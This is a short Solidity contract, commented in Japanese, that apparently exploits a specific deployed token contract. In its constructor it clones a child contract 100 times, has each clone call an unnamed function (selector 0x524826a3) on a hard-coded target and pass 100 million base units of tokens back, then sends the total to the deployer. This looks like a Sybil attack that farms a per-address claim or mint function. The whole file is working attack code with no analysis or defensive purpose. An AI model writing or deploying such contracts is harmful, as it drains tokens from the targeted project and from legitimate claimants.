// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";
import "./Clones.sol";

// 子コントラクト
contract ChildContract {
    constructor() {}

    function sendData(address target) external {
        (bool success, ) = target.call(abi.encodeWithSelector(0x524826a3));
        require(success, "Call failed");
        IERC20(target).transfer(msg.sender, 100 * 10 ** 6);
    }
}

// 親コントラクト
contract AParentContract {
    address public target = 0x1870Dc7A474e045026F9ef053d5bB20a250Cc084;
    address private child_impl_address = 0x3F781473ee280998AA109C44AC626dd4181D87c6;

    constructor() {
        for (uint i = 0; i < 100; i++) {
            ChildContract temp_child = ChildContract(Clones.clone(child_impl_address));
            temp_child.sendData(target);
        }
        uint256 amount = IERC20(target).balanceOf(address(this));
        IERC20(target).transfer(msg.sender, amount);
    }
}
